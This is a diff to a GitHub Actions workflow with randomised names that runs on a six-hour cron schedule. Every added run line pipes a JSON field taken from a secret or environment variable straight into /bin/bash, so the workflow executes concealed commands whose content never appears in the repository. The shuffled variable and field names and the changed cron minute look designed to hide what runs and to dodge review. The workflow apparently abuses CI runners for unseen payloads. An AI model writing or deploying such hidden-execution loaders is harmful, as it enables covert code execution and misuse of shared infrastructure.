@@ -1,26 +1,30 @@
 name: lidagong0987
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 2/6 * * *'
+    - cron: '36 2/6 * * *'
 
-jobs:  # 1573
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: lidagong0987
         env:
-          x5: ${{ secrets.x5 }}
+          koi9: ${{ secrets.koi9 }}
         run: |
-          echo $x5 | jq -r .v155 | /bin/bash
-          echo $zbs39254 | jq -r .xcc6 | /bin/bash
-          echo $c3 | jq -r .rk977 | /bin/bash
-          echo $k45 | jq -r .la2 | /bin/bash
-          echo $ql69634 | jq -r .jlzm6 | /bin/bash
-          echo $nvt8 | jq -r .dgx958 | /bin/bash
-          echo $hvmmd15617 | jq -r .jy378 | /bin/bash
-          echo $oerbc48 | jq -r .nf78 | /bin/bash
-          echo $bafu3 | jq -r .z27 | /bin/bash
+          echo $koi9 | jq -r .m692 | /bin/bash
+          echo $cvhry12011 | jq -r .qbkx1608 | /bin/bash
+          echo $pwi71865 | jq -r .a4194 | /bin/bash
+          echo $xdhs50268 | jq -r .cbb8 | /bin/bash
+          echo $yml907 | jq -r .v2 | /bin/bash
+          echo $gxsje67160 | jq -r .obi896 | /bin/bash
+          echo $demrk0 | jq -r .gepl99835 | /bin/bash
+          echo $g69 | jq -r .dro3889 | /bin/bash
+          echo $ecsa51 | jq -r .iondu6 | /bin/bash
+          echo $cs790 | jq -r .teuw0 | /bin/bash
+          echo $knlil12 | jq -r .gemo9 | /bin/bash
+          echo $lj5763 | jq -r .pnfy9 | /bin/bash
+          echo $i453 | jq -r .cwgpg1562 | /bin/bash
 
